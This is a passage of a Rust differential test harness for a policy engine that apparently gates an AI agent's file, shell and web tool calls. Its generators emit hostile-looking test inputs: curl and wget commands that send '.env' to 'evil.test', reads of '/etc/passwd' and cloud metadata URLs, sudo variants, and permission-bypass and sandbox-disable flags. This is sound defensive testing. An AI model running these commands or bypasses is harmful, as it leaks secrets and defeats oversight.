//! QA-POLICY-AT two-head differential (the check's OWN harness; never committed; never inside a tree whose whole
//! suite runs). The SAME file is compiled release at the base 184b35e and at the head a8d910f, each in its own tree
//! and its own empty target dir. It uses only the crate's public API and the two PROTECTED test helpers `common` and
//! `bypass_common` (byte-identical at both SHAs); it does NOT include `owner_common` (whose generator differs between
//! the SHAs): the owner-shaped hooks come from ONE copy of the generator below, so both trees get the same hooks.
//!
//! The fixture is built at a FIXED root (`$QPA_FIX`, no process id in it), with exactly the files of
//! `common::fixture` + `bypass_common::mode_fixture`; base and head run one after the other on the same root, so
//! every path and every card hash is the same text in both outputs. The root is masked anyway (every case form).
//!
//! Env: QPA_OUT (output .jsonl), QPA_SEED (hex), QPA_ROWS (the corpus file, jsonl), QPA_FIX (fixture root),
//! QPA_O2 (an outside folder, absolute), QPA_TWIN=1 (base tree only: per row, the harness's own predicted extra
//! pieces decided ALONE by this tree's engine, for attribution), QPA_N_* (generated counts).
#![cfg(unix)]
mod bypass_common;
mod common;
use bypass_common::*;
use coagent_policy::*;
use common::*;
use serde_json::{json, Value};
use std::collections::{BTreeSet, HashSet};
use std::io::Write;
use std::path::{Path, PathBuf};

fn touch(p: &Path, content: &str) {
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, content).unwrap();
}

/// `common::fixture` + `mode_fixture`, at a fixed root.
fn qpa_fixture(root: &Path) -> Fx {
    if root.exists() {
        // only a root this harness made before (its own marker file)
        assert!(root.join("QPA_FIXTURE").exists(), "QPA: {root:?} exists and is not ours");
        let q = root.with_extension(format!("old{}", std::process::id()));
        std::fs::rename(root, &q).unwrap(); // never delete: move aside
    }
    let ws = root.join("ws");
    let home = root.join("home");
    let outside = root.join("outside");
    touch(&root.join("QPA_FIXTURE"), "qpa\n");
    touch(&ws.join("src/main.rs"), "fn main() {}\n");
    touch(&ws.join("README.md"), "readme\n");
    touch(&ws.join(".env"), "TOKEN=fake\n");
    touch(&ws.join(".claude/settings.json"), "{}\n");
    touch(&ws.join(".git/hooks/README"), "hooks\n");
    touch(&ws.join(".git/HEAD"), "ref: refs/heads/main\n");
    touch(&ws.join("secret/plan.txt"), "plan\n");
    touch(&home.join(".ssh/id_rsa"), "fake key\n");
    touch(&home.join(".claude/settings.json"), "{}\n");
    touch(&home.join(".zshrc"), "# rc\n");
    touch(&outside.join("secret.txt"), "outside\n");
    // mode_fixture's extra files
    touch(&root.join("gate-config/inbox.json"), "[]\n");
    touch(&ws.join("Makefile"), "all:\n");
    touch(&ws.join(".git/config"), "[core]\n");
    touch(&home.join(".gitconfig"), "[user]\n");
    touch(&home.join(".local/bin/tool"), "#!/bin/sh\n");
    touch(&home.join(".cargo/config.toml"), "[build]\n");
    touch(&home.join("notes/todo.txt"), "todo\n");
    touch(&home.join(".coagent/session.json"), "{}\n");
    let canon = |p: &Path| std::fs::canonicalize(p).unwrap();
    Fx {
        ws: canon(&ws),
        home: canon(&home),
        outside: canon(&outside),
        root: canon(root),
    }
}

struct Mask(Vec<(String, String)>);
impl Mask {
    fn apply(&self, s: &str) -> String {
        let mut s = s.to_string();
        for (a, b) in &self.0 {
            if s.contains(a.as_str()) {
                s = s.replace(a.as_str(), b);
            }
        }
        s
    }
}

fn fnv(s: &str) -> String {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in s.bytes() {
        h ^= b as u64;
        h = h.wrapping_mul(0x0100_0000_01b3);
    }
    format!("{h:016x}")
}

/// One decision, structured, masked. `full`: also the whole masked Debug (probe rows).
fn enc(d: &Decision, m: &Mask, at_row: bool, full: bool) -> Value {
    let mut v = match d {
        Decision::Allow { why } => json!({"k": "A", "w": m.apply(&format!("{why:?}"))}),
        Decision::Deny { reason } => {
            json!({"k": "D", "r": m.apply(&format!("{reason:?}")), "t": m.apply(&reason.text())})
        }
        Decision::Ask { card } => {
            let mut rest = (**card).clone();
            rest.targets.clear();
            rest.reasons.clear();
            let mut o = json!({
                "k": "Q",
                "tier": format!("{:?}", card.tier),
                "rs": card.reasons.iter().map(|r| m.apply(&format!("{r:?}"))).collect::<Vec<_>>(),
                "th": fnv(&m.apply(&format!("{:?}", card.targets))),
                "rest": fnv(&m.apply(&format!("{rest:?}"))),
            });
            if at_row {
                o["tg"] = json!(card.targets.iter().map(|t| m.apply(t)).collect::<Vec<_>>());
            }
            o
        }
    };
    if full {
        v["full"] = json!(m.apply(&format!("{d:?}")));
    }
    v
}

fn views() -> Vec<(&'static str, BypassView)> {
    vec![
        ("live", live()),
        ("live_shell", live_shell()),
        ("expired", view(NOW, &[SESSION], true)),
        ("other", view(NOW.plus_secs(3600), &["other"], true)),
        ("nobody", view(NOW.plus_secs(3600), &[], true)),
    ]
}

fn owners() -> Vec<(&'static str, OwnerAllow)> {
    let ov = |s: &[&str], t: TerminalCommands| OwnerAllow {
        bound_sessions: s.iter().map(|x| x.to_string()).collect::<BTreeSet<_>>(),
        terminal: t,
    };
    vec![
        ("StillAsk", ov(&[SESSION], TerminalCommands::StillAsk)),
        ("Allowed", ov(&[SESSION], TerminalCommands::Allowed)),
        ("Allowed_other", ov(&["other"], TerminalCommands::Allowed)),
        ("Allowed_nobody", ov(&[], TerminalCommands::Allowed)),
    ]
}

/// The 12 columns: decide, would_have_been, 5 both-agree views, owner none, 4 owner views.
fn columns(a: &Action, st: &State, f: &OwnerInputFacts, m: &Mask, at_row: bool, full: bool) -> Vec<Value> {
    let mut c = Vec::with_capacity(12);
    c.push(enc(&decide(a, st, Surface::Console, NOW), m, at_row, full));
    let (t, rs) = would_have_been(a, st);
    c.push(json!({"k": "W", "tier": format!("{t:?}"), "rs": rs.iter().map(|r| m.apply(&format!("{r:?}"))).collect::<Vec<_>>()}));
    for (_, v) in views() {
        c.push(enc(&decide_with_mode(a, st, Some(&v), Surface::Console, NOW), m, at_row, full));
    }
    c.push(enc(&decide_with_owner_allow(a, st, None, f, Surface::Console, NOW), m, at_row, full));
    for (_, o) in owners() {
        c.push(enc(&decide_with_owner_allow(a, st, Some(&o), f, Surface::Console, NOW), m, at_row, full));
    }
    c
}

/// The texts this action's scans read: each command target's scan as stored in the action, and each free text
/// scanned as `classify` scans it (bounded to `MAX_FREE_TEXT_CHARS` characters, Bash dialect).
fn scans(a: &Action) -> Vec<(String, shell::ExecScan)> {
    let mut v = Vec::new();
    for t in &a.targets {
        match t {
            Target::Command { scan, shell, .. } => v.push((format!("cmd:{shell:?}"), scan.clone())),
            Target::Raw { input } => v.push(("raw".into(), free_scan(input))),
            Target::Query { text } => v.push(("query".into(), free_scan(text))),
            Target::Url { url, .. } => v.push(("url".into(), free_scan(url))),
            _ => {}
        }
    }
    v
}

fn free_scan(t: &str) -> shell::ExecScan {
    let b: String = t.chars().take(action::MAX_FREE_TEXT_CHARS).collect();
    shell::scan_execute(&b, ShellKind::Bash)
}

/// The harness's OWN prediction of the pieces the new pass adds to a scan (written from the brief's rule, not the
/// head's code): the text after each `@` of each exact word, then of each piece, not empty, not starting with `-`,
/// not already present, until the list holds MAX_MENTIONS + 1 pieces. Meaningful on the BASE scan only.
fn predict_extra(s: &shell::ExecScan) -> Vec<String> {
    let cap = action::MAX_MENTIONS + 1;
    let mut have: HashSet<String> = s.pieces.iter().cloned().collect();
    let mut n = s.pieces.len();
    let mut out = Vec::new();
    let words: Vec<String> = s.exact.iter().chain(s.pieces.iter()).cloned().collect();
    'w: for w in &words {
        let mut start = 0;
        while let Some(off) = w[start..].find('@') {
            let i = start + off;
            if n >= cap {
                break 'w;
            }
            let suf = &w[i + 1..];
            if !suf.is_empty() && !suf.starts_with('-') && have.insert(suf.to_string()) {
                out.push(suf.to_string());
                n += 1;
            }
            start = i + 1;
        }
    }
    out
}

const OVER_CMD: &str = "command too long or naming too many words for the gate to check";
const OVER_PATH: &str = "a path is longer or deeper than the gate can check";
const OVERSIZE_WHY: &str = "longer than the gate's bound";

fn n_components(pieces: &[String]) -> usize {
    pieces.iter().map(|p| p.split(['/', '\\']).filter(|c| !c.is_empty()).count().max(1)).sum()
}

fn over_bound(pieces: &[String]) -> bool {
    pieces.len() > action::MAX_MENTIONS || n_components(pieces) > action::MAX_MENTION_COMPONENTS
}

/// A free-text word as `classify` makes it (written from the brief and `action.rs`'s documented rule).
fn in_text(raw: &str, cwd: &Path, env: &Env) -> NormPath {
    let expanded = if raw == "~" {
        env.home.clone()
    } else if let Some(r) = raw.strip_prefix("~/") {
        env.home.join(r)
    } else {
        cwd.join(raw)
    };
    let lexical = (raw.len() <= path::MAX_PATH_BYTES).then(|| path::lexical_clean(&expanded));
    NormPath::Uncertain { raw: raw.to_string(), lexical, why: "free text (not resolved)" }
}

struct Model {
    action: Action,
    extras: Vec<String>,
}

/// The head's action as the RULE predicts it, built from the BASE action: each command's predicted pieces become
/// `Mentioned` paths after that command's own mentions (all of that command's mentions dropped and the action marked
/// oversize when the longer list crosses a bound); each free text's predicted pieces become `InText` paths after that
/// text's own. `None` when nothing is predicted.
fn model_head(a: &Action, h: &HookInput, env: &Env) -> Option<Model> {
    let cwd = Path::new(&h.cwd);
    let mut extras_all: Vec<String> = Vec::new();
    let mut note = |ex: &[String]| {
        for e in ex {
            if !extras_all.contains(e) {
                extras_all.push(e.clone());
            }
        }
    };
    let mut free: Vec<(usize, Vec<String>)> = Vec::new();
    for t in &a.targets {
        let txt = match t {
            Target::Raw { input } => input,
            Target::Query { text } => text,
            Target::Url { url, .. } => url,
            _ => continue,
        };
        let s = free_scan(txt);
        free.push((s.pieces.len().min(action::MAX_FREE_PIECES), predict_extra(&s)));
    }
    let mut out: Vec<Target> = Vec::new();
    let mut cmd_over: Vec<bool> = Vec::new();
    let n = a.targets.len();
    let mut i = 0;
    while i < n {
        match &a.targets[i] {
            Target::Command { scan, class, .. } => {
                let why_over = matches!(class, ShellClass::Execute { why } if why.as_str() == OVERSIZE_WHY);
                let ex = predict_extra(scan);
                note(&ex);
                let mut all = scan.pieces.clone();
                all.extend(ex.iter().cloned());
                let head_over = why_over || over_bound(&all);
                cmd_over.push(head_over);
                out.push(a.targets[i].clone());
                i += 1;
                while i < n && matches!(&a.targets[i], Target::Path { role: PathRole::Mentioned, .. }) {
                    if !head_over {
                        out.push(a.targets[i].clone());
                    }
                    i += 1;
                }
                if !head_over {
                    for e in &ex {
                        out.push(Target::Path { role: PathRole::Mentioned, path: PosixNormaliser.normalise(e, cwd, env) });
                    }
                }
            }
            Target::Path { role: PathRole::InText, .. } => break,
            t => {
                out.push(t.clone());
                i += 1;
            }
        }
    }
    for (size, ex) in &free {
        for _ in 0..*size {
            assert!(matches!(&a.targets[i], Target::Path { role: PathRole::InText, .. }), "QPA model: InText layout");
            out.push(a.targets[i].clone());
            i += 1;
        }
        note(ex);
        for e in ex {
            out.push(Target::Path { role: PathRole::InText, path: in_text(e, cwd, env) });
        }
    }
    assert_eq!(i, n, "QPA model: every base target placed");
    if extras_all.is_empty() {
        return None;
    }
    let mut m = a.clone();
    let mut k = 0;
    m.oversize = out.iter().find_map(|t| match t {
        Target::Command { .. } => {
            let o = cmd_over[k];
            k += 1;
            o.then_some(OVER_CMD)
        }
        Target::Path { role, path: NormPath::Uncertain { why, .. } } if *role != PathRole::InText && *why == path::TOO_LONG => {
            Some(OVER_PATH)
        }
        _ => None,
    });
    m.targets = out;
    Some(Model { action: m, extras: extras_all })
}

fn sq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

struct Row {
    id: String,
    grp: String,
    tool: String,
    cwd: PathBuf,
    input: Value,
    share: Option<Option<bool>>,
    origin: Option<Origin>,
    full: bool,
}

fn subst(v: &mut Value, reps: &[(&str, String)]) {
    match v {
        Value::String(s) => {
            for (a, b) in reps {
                if s.contains(a) {
                    *s = s.replace(a, b);
                }
            }
        }
        Value::Array(a) => a.iter_mut().for_each(|x| subst(x, reps)),
        Value::Object(o) => o.values_mut().for_each(|x| subst(x, reps)),
        _ => {}
    }
}

// ------------------------------------------------------------------------------------------------------------
// Generators (ONE copy, in this file)
// ------------------------------------------------------------------------------------------------------------

/// The owner suite's generated hooks, ONE copy (the head's `gen_input`, whose flag line is a single draw; copied
/// so both trees generate the same hooks). Paths and words as `owner_common` at the head.
mod gen_owner {
    use super::*;
    pub fn gen_paths(fx: &Fx) -> Vec<String> {
        let ws = fx.ws.to_str().unwrap().to_string();
        let home = fx.home.to_str().unwrap().to_string();
        let out = fx.outside.to_str().unwrap().to_string();
        let root = fx.root.to_str().unwrap().to_string();
        let mut v: Vec<String> = vec![
            format!("{ws}/README.md"), format!("{ws}/src/main.rs"), format!("{ws}/src"), format!("{ws}/src/"),
            ws.clone(), format!("{ws}/.env"), format!("{ws}/.ENV"), format!("{ws}/secret/plan.txt"),
            format!("{ws}/.claude/settings.json"), format!("{ws}/.CLAUDE/settings.json"), format!("{ws}/.git/config"),
            format!("{ws}/.git/hooks/pre-commit"), format!("{ws}/.GIT/config"), format!("{ws}/Makefile"),
            format!("{ws}/CLAUDE.md"), format!("{ws}//src//main.rs"), format!("{ws}/src/../.claude/settings.json"),
            format!("{ws}/../home/.coagent/session.json"), format!("{ws}/../home/.ssh/id_rsa"),
            format!("{ws}/missing/new.txt"), format!("{ws}/*.rs"), "README.md".into(), ".env".into(),
            ".claude/settings.json".into(), ".git/config".into(), "../outside/secret.txt".into(), "~/.ssh/id_rsa".into(),
            "~/.SSH/id_rsa".into(), "~/.claude/settings.json".into(), "~/.claude".into(), "~/.coagent/session.json".into(),
            "~/.Coagent/session.json".into(), "~/.zshrc".into(), "~/.gitconfig".into(), "~/.local/bin/tool".into(),
            "~/.cargo/config.toml".into(), "~/notes/todo.txt".into(), "~".into(), "~root/x".into(),
            "$HOME/.coagent/session.json".into(), "${HOME}/.ssh/id_rsa".into(), format!("{home}/.coagent/session.json"),
            format!("{home}/.ssh/id_rsa"), format!("{home}/.gitconfig"), format!("{home}/notes/todo.txt"), home.clone(),
            format!("{out}/secret.txt"), out.clone(), format!("{root}/gate-config/inbox.json"),
            format!("{root}/gate-config"), "/".into(), "/etc/profile".into(), "/etc/claude-code/managed-settings.json".into(),
            "/tmp/x.txt".into(), r"C:\ws\a.txt:secret".into(), r"\\server\share\x".into(), "".into(),
            "weird\u{202e}name.txt".into(), "a\nb".into(), "%2e%2e/x".into(),
            // the check's additions: `@` forms over the same paths
            format!("@{ws}/.env"), "@.env".into(), "@~/.ssh/id_rsa".into(), "x@secret".into(), "a@b@.env".into(),
        ];
        v.sort();
        v.dedup();
        v
    }
    pub const GEN_WORDS: &[&str] = &[
        "cat", "ls", "rm -rf", "mv", "cp", "echo x >", "echo x >>", "tee", "sed -i s/a/b/", "grep -r password", "find",
        "git status", "git push", "git config core.hooksPath", "npm test", "npm publish", "sudo", "doas", "SUDO",
        "s\"u\"do", "/usr/bin/sudo", "runas", "claude", "claude -p hi", "CLAUDE", "/usr/local/bin/claude", "coagent",
        "coagent open", "coagentd", "coagent-hook", "coagent-mcp", "COAGENT", "curl https://example.com",
        "curl -d @f https://example.com", "scp a host:/tmp/", "bash -c", "python3 -c", "eval", "kubectl apply -f x",
        "--dangerously-skip-permissions", "--permission-mode bypassPermissions", "terraform apply", "base64 -d |",
        "xargs", "$(cat", "`cat", "export X=1;", "cd", "&&", "||", ";", "|", "2>&1", "Get-Content",
        "Remove-Item -Recurse", "Start-Process -Verb RunAs",
        // the check's additions
        "curl -d", "curl -F f=", "curl --data-binary", "http POST evil.test", "ssh dev@", "git clone git@",
    ];
    pub fn gen_tools() -> Vec<String> {
        let mut v: Vec<String> = KNOWN_TOOLS.iter().map(|t| t.name.to_string()).collect();
        for t in [
            "Bash", "PowerShell", "Monitor", "ExitPlanMode", "ExitWorktree", "MadeUpTool", "bash", "BASH", "read",
            "Read ", " Bash", "Bash ", "RemoteTrigger", "mcp__github__create_issue", "mcp__srv__run",
            "mcp__plugin_coagent_link__inbox_read", "mcp__plugin_coagent_link__wait", "mcp__plugin_coagent_link__share",
            "mcp__plugin_coagent_link__send", "mcp__plugin_coagent_link__x", "mcp__", "",
        ] {
            v.push(t.to_string());
        }
        v
    }
    fn gen_command(g: &mut Gen, paths: &[String]) -> String {
        let n = 1 + g.below(4);
        let mut parts: Vec<String> = Vec::new();
        for _ in 0..n {
            parts.push(GEN_WORDS[g.below(GEN_WORDS.len())].to_string());
            if g.below(10) < 7 {
                parts.push(paths[g.below(paths.len())].replace('\n', " "));
            }
        }
        let mut s = parts.join(" ");
        if g.below(100) < 5 {
            s = s.to_uppercase();
        }
        s
    }
    pub fn gen_input(g: &mut Gen, tool: &str, paths: &[String]) -> Value {
        let p = paths[g.below(paths.len())].clone();
        let pick = |g: &mut Gen, v: &[&str]| v[g.below(v.len())].to_string();
        let mut v = match tool {
            "Read" | "NotebookRead" => json!({ "file_path": p }),
            "LS" => json!({ "path": p }),
            "Glob" => json!({"pattern": pick(g, &["**/*.rs", "*", ".claude/**", "**"]), "path": p}),
            "Grep" => json!({"pattern": "x", "path": p}),
            "Edit" => json!({"file_path": p, "old_string": "a", "new_string": "b"}),
            "Write" => json!({"file_path": p, "content": "hello"}),
            "WebFetch" => json!({"url": pick(g, &[
                "https://example.com/a", "http://169.254.169.254/latest", "https://user@example.com", "file:///etc/passwd",
                "example.com/docs", "ftp://example.com", "https://ex%61mple.com", "", "https://user@.env/x"]), "prompt": "p"}),
            "WebSearch" => json!({ "query": format!("q {p}") }),
            "Agent" | "Task" => {
                let mut a = json!({"prompt": format!("look at {p}"), "description": "d"});
                if g.below(10) < 4 {
                    a["isolation"] = json!(pick(g, &["local", "remote", "worktree", "weird", ""]));
                }
                if g.below(10) < 2 {
                    a["name"] = json!("mate");
                }
                a
            }
            "Bash" | "PowerShell" | "Monitor" => json!({"command": gen_command(g, paths), "description": "d"}),
            "ExitWorktree" => json!({"action": pick(g, &["keep", "remove"])}),
            "ExitPlanMode" => json!({"plan": "x"}),
            "mcp__plugin_coagent_link__share" | "mcp__plugin_coagent_link__send" => {
                json!({"kind": "chat", "text": format!("hi {p}")})
            }
            _ => match g.below(4) {
                0 => json!({}),
                1 => json!({ "path": p }),
                2 => json!({"file_path": p, "x": 1}),
                _ => json!({ "q": p }),
            },
        };
        if g.below(100) < 12 {
            v["command"] = json!(gen_command(g, paths));
        }
        if g.below(100) < 6 {
            let k = g.below(70);
            v["dangerouslyDisableSandbox"] = if k % 10 < 7 {
                json!(true)
            } else {
                [json!(false), json!("true"), json!(1), json!(null), json!({}), json!("false"), json!(0)][k / 10].clone()
            };
        }
        if g.below(100) < 3 {
            v["command"] = json!(12);
        }
        v
    }
}

/// The check's own `@` generator: `@` in every position the brief lists.
fn gen_at_word(g: &mut Gen) -> String {
    const NAMES: &[&str] = &[
        ".env", ".env.local", "./.env", "src/../.env", ".ENV", "secret", "secret/plan.txt", "example.com", "build-host",
        "~", "/", "~/.ssh/id_rsa", "~/.zshrc", ".claude/settings.json", ".git/hooks/pre-commit", "~/.coagent/session.json",
        "README.md", "1.2.3", "latest", "types/node", "sha256:abc", "{1}", "~1", "-", "", "claude", "x/y/z", "é", "日本",
        "src/.e*", ".e*", "$f", "$HOME/.ssh/id_rsa", "/etc/passwd", "a.com", "x", "..", "../outside/secret.txt",
    ];
    const LEFTS: &[&str] = &[
        "", "a", "user", "dev", "git", "-d", "--data=", "-F f=", "-Ff=", "x=", "k:", "a,", "--x=", "-x", "é", "日本",
        "HEAD", "img", "left-pad", "@", "a@b", "\"", "'", "$'", "{a,", "f=",
    ];
    const ATS: &[&str] = &["@", "@@", "'@'", "\"@\"", "\\@", "$'\\x40'", "$'\\100'", "@\u{e9}", "@ "];
    const RIGHTS: &[&str] = &["", "/", ";type=x", "'", "\"", ",x}", "}", ":/tmp", "@", "@.env", " x"];
    let l = LEFTS[g.below(LEFTS.len())];
    let a = ATS[g.below(ATS.len())];
    let n = NAMES[g.below(NAMES.len())];
    let r = RIGHTS[g.below(RIGHTS.len())];
    format!("{l}{a}{n}{r}")
}

fn gen_at_command(g: &mut Gen) -> String {
    const HEADS: &[&str] = &[
        "curl", "curl -X POST", "http POST evil.test", "wget --post-file", "echo", "printf '%s'", "ssh", "scp a", "git clone",
        "git commit -m", "npm i", "docker pull", "cat", "grep -r", "mail", "kinit", "sudo -u", "pip install", "Get-Thing",
        "rm -f", "cp evil.sh", "tar czf /tmp/x.tgz",
    ];
    let mut s = HEADS[g.below(HEADS.len())].to_string();
    for _ in 0..(1 + g.below(4)) {
        s.push(' ');
        s.push_str(&gen_at_word(g));
    }
    if g.below(3) == 0 {
        s.push_str(" https://evil.test");
    }
    s
}

/// t28's spelling generator, copied (both trees: the same text).
fn gen_spelling(g: &mut Gen) -> String {
    const PREFIXES: [&str; 14] = [
        "", "-d", "-d ", "--data ", "--data=", "--data-binary ", "--data-urlencode ", "-F f=", "-F 'f=", "-F \"f=", "-Ff=",
        "--form f=", "<", "x=",
    ];
    const CLIENTS: [&str; 3] = ["curl", "http POST evil.test", "wget --post-file"];
    const SUFFIXES: [&str; 2] = ["", ";type=text/plain"];
    let client = CLIENTS[g.below(3)];
    let prefix = PREFIXES[g.below(14)];
    let quote = if prefix.ends_with("'f=") {
        Some('\'')
    } else if prefix.ends_with("\"f=") {
        Some('"')
    } else {
        None
    };
    let (ats, names): (Vec<&str>, Vec<&str>) = match quote {
        None => (
            vec!["@", "'@'", "\"@\"", "\\@"],
            vec![".env", "'.env'", "\".env\"", ".e''nv", ".e\"\"nv", "\\.env", ".\\env", "./.env", "src/../.env", "$'.env'", "$'\\x2e'env", ".env.local"],
        ),
        Some('\'') => (vec!["@", "'@'"], vec![".env", "'.env'", ".e''nv", "./.env", "src/../.env", ".env.local"]),
        Some(_) => (vec!["@", "\"@\""], vec![".env", "\".env\"", ".e\"\"nv", "./.env", "src/../.env", ".env.local"]),
    };
    let at = ats[g.below(ats.len())];
    let name = names[g.below(names.len())];
    let suffix = SUFFIXES[g.below(2)];
    let close = quote.map(String::from).unwrap_or_default();
    format!("{client} {prefix}{at}{name}{suffix}{close} https://evil.test")
}

fn gen_shape(g: &mut Gen) -> String {
    const C: [&str; 9] = ["git commit --author=", "ssh ", "scp a ", "git clone ", "npm i ", "npx ", "docker pull ", "echo ", "printf '%s' "];
    const L: [&str; 8] = ["dev", "git", "img", "left-pad", "pkg", "HEAD", "user", ""];
    const R: [&str; 14] = [
        "example.com", "build-host", "1.2.3", "latest", "types/node", "sha256:abc", "{1}", "~1", "-", "claude", "coagent",
        "claude-code", "build-host:/tmp", "example.com:org/r.git",
    ];
    format!("{}{}@{}", C[g.below(9)], L[g.below(8)], R[g.below(14)])
}

/// Free text: short texts with `@` anywhere, and every tenth a LONG one (150..=260 distinct words, `@` words
/// first, an excluded name in the last 20 words).
fn gen_free(g: &mut Gen, i: usize) -> String {
    const LATE: &[&str] = &[".env", "secret/plan.txt", ".env.local", "example.com", "secret", "x.com"];
    if i % 10 == 0 {
        let n = 150 + g.below(111);
        let at_n = g.below(60);
        let late_at = n - 1 - g.below(20);
        let mut w: Vec<String> = Vec::new();
        for k in 0..n {
            if k == late_at {
                w.push(LATE[g.below(LATE.len())].to_string());
            } else if k < at_n {
                w.push(format!("u{k}@h{k}"));
            } else {
                w.push(format!("w{k}"));
            }
        }
        w.join(" ")
    } else {
        let mut s = String::new();
        for _ in 0..(1 + g.below(6)) {
            s.push_str(&gen_at_word(g));
            s.push(' ');
            if g.below(2) == 0 {
                s.push_str(LATE[g.below(LATE.len())]);
                s.push(' ');
            }
        }
        s
    }
}

fn free_input(g: &mut Gen, text: &str) -> (String, Value) {
    match g.below(7) {
        0 => ("WebSearch".into(), json!({ "query": text })),
        1 => ("WebFetch".into(), json!({ "url": format!("https://example.com/{}", text.replace(' ', "/")), "prompt": text })),
        2 => ("Agent".into(), json!({ "prompt": text, "description": "d" })),
        3 => ("mcp__github__create_issue".into(), json!({ "title": text, "body": text })),
        4 => ("MadeUpTool".into(), json!({ "q": text })),
        5 => {
            let mut m = serde_json::Map::new();
            m.insert(text.split(' ').next().unwrap_or("k").to_string(), json!("v@.env"));
            m.insert("a@b".to_string(), json!(text));
            ("mcp__srv__lookup".into(), Value::Object(m))
        }
        _ => ("Task".into(), json!({ "prompt": text, "description": "d@x" })),
    }
}

fn cmd_tool(g: &mut Gen) -> &'static str {
    ["Bash", "Bash", "Bash", "Bash", "Bash", "Monitor", "PowerShell", "MadeUpTool", "mcp__srv__run"][g.below(9)]
}

fn envn(k: &str, d: usize) -> usize {
    std::env::var(k).ok().and_then(|s| s.parse().ok()).unwrap_or(d)
}

#[test]
fn qpa_diff() {
    let out = std::env::var("QPA_OUT").expect("QPA_OUT");
    let seed = u64::from_str_radix(std::env::var("QPA_SEED").expect("QPA_SEED").trim_start_matches("0x"), 16).unwrap();
    let rows_file = std::env::var("QPA_ROWS").expect("QPA_ROWS");
    let fixroot = PathBuf::from(std::env::var("QPA_FIX").expect("QPA_FIX"));
    let o2 = PathBuf::from(std::env::var("QPA_O2").expect("QPA_O2"));
    let twin_on = std::env::var("QPA_TWIN").ok().as_deref() == Some("1");
    std::fs::create_dir_all(&o2).unwrap();
    let o2 = std::fs::canonicalize(&o2).unwrap();
    let fx = qpa_fixture(&fixroot);
    let root = fx.root.to_str().unwrap().to_string();
    let mask = Mask(vec![
        (root.clone(), "<root>".into()),
        (root.to_uppercase(), "<root>".into()),
        (root.to_lowercase(), "<root>".into()),
        (o2.to_str().unwrap().to_string(), "<o2>".into()),
        (o2.to_str().unwrap().to_uppercase(), "<o2>".into()),
    ]);
    // states
    let grant_only = {
        let mut st = fx.state();
        let mut g: Value = serde_json::from_str(&wide_grant()).unwrap();
        g["exclude"] = json!(["**/.env*", "**/secret/**"]);
        fx.grant(&mut st, &g.to_string()).unwrap();
        st
    };
    let sandbox_on = {
        let mut st = fx.state_with(vec!["**/.env*".to_string()]);
        st.sandbox = Sandbox::On;
        st
    };
    let states: Vec<(&str, State)> = vec![
        ("nothing", fx.state()),
        ("default", fx.state_with(patterns::default_exclusions())),
        ("**/.env*", fx.state_with(vec!["**/.env*".to_string()])),
        (".env*", fx.state_with(vec![".env*".to_string()])),
        ("**/secret/**", fx.state_with(vec!["**/secret/**".to_string()])),
        ("grant-only", grant_only),
        ("sandboxOn+**/.env*", sandbox_on),
        ("**/example.com/**", fx.state_with(vec!["**/example.com/**".to_string()])),
        ("*.com", fx.state_with(vec!["*.com".to_string()])),
        ("**/.env*+**/secret/**", fx.state_with(vec!["**/.env*".to_string(), "**/secret/**".to_string()])),
    ];
    let cwd_of = |k: &str| -> PathBuf {
        match k {
            "ws" => fx.ws.clone(),
            "home" => fx.home.clone(),
            "outside" => fx.outside.clone(),
            "o2" => o2.clone(),
            "src" => fx.ws.join("src"),
            other => PathBuf::from(other), // "/", "", "rel"
        }
    };
    let reps: Vec<(&str, String)> = vec![
        ("<ws>", fx.ws.to_str().unwrap().to_string()),
        ("<home>", fx.home.to_str().unwrap().to_string()),
        ("<outside>", fx.outside.to_str().unwrap().to_string()),
        ("<o2>", o2.to_str().unwrap().to_string()),
        ("<root>", root.clone()),
    ];
    let mut rows: Vec<Row> = Vec::new();
    // C1 and the check's own rows: from the corpus file
    for (n, l) in std::fs::read_to_string(&rows_file).unwrap().lines().enumerate() {
        if l.trim().is_empty() {
            continue;
        }
        let v: Value = serde_json::from_str(l).unwrap_or_else(|e| panic!("QPA rows line {}: {e}", n + 1));
        let mut input = v["input"].clone();
        subst(&mut input, &reps);
        rows.push(Row {
            id: v["id"].as_str().unwrap().to_string(),
            grp: v["grp"].as_str().unwrap().to_string(),
            tool: v["tool"].as_str().unwrap().to_string(),
            cwd: cwd_of(v["cwd"].as_str().unwrap_or("ws")),
            input,
            share: None,
            origin: None,
            full: v["full"].as_bool().unwrap_or(false),
        });
    }
    let mut g = Gen(seed);
    // C2: the shared shell-command generator (common, protected), each through a command tool of ours
    for (i, c) in generated_shell_commands(seed ^ 0x51, envn("QPA_N_SH", 2_500)).into_iter().enumerate() {
        let tool = cmd_tool(&mut g);
        rows.push(Row { id: format!("c2sh:{i}"), grp: "C2sh".into(), tool: tool.into(), cwd: fx.ws.clone(), input: json!({ "command": c }), share: None, origin: None, full: false });
    }
    // C2: the check's own `@` generator
    for i in 0..envn("QPA_N_AT", 3_000) {
        let c = gen_at_command(&mut g);
        let tool = cmd_tool(&mut g);
        let cwd = [fx.ws.clone(), fx.ws.join("src"), fx.home.clone(), fx.outside.clone()][g.below(4)].clone();
        rows.push(Row { id: format!("c2at:{i}"), grp: "C2at".into(), tool: tool.into(), cwd, input: json!({ "command": c }), share: None, origin: None, full: false });
    }
    // C2: t28's spelling generator and the non-file shapes
    for i in 0..envn("QPA_N_SP", 1_000) {
        let c = gen_spelling(&mut g);
        let tool = cmd_tool(&mut g);
        rows.push(Row { id: format!("c2sp:{i}"), grp: "C2sp".into(), tool: tool.into(), cwd: fx.ws.clone(), input: json!({ "command": c }), share: None, origin: None, full: false });
    }
    for i in 0..envn("QPA_N_SH2", 500) {
        let c = gen_shape(&mut g);
        let tool = cmd_tool(&mut g);
        rows.push(Row { id: format!("c2np:{i}"), grp: "C2np".into(), tool: tool.into(), cwd: fx.ws.clone(), input: json!({ "command": c }), share: None, origin: None, full: false });
    }
    // C2: owner-shaped generated hooks, ONE generator
    {
        let paths = gen_owner::gen_paths(&fx);
        let tools = gen_owner::gen_tools();
        let mut go = Gen(seed ^ 0x0A11);
        for i in 0..envn("QPA_N_OWN", 2_000) {
            let tool = tools[go.below(tools.len())].clone();
            let input = gen_owner::gen_input(&mut go, &tool, &paths);
            let cwd = match go.below(12) {
                0 => fx.home.clone(),
                1 => fx.outside.clone(),
                2 => fx.ws.join("src"),
                3 => PathBuf::from(""),
                _ => fx.ws.clone(),
            };
            let share = [None, Some(true), Some(false)][go.below(3)];
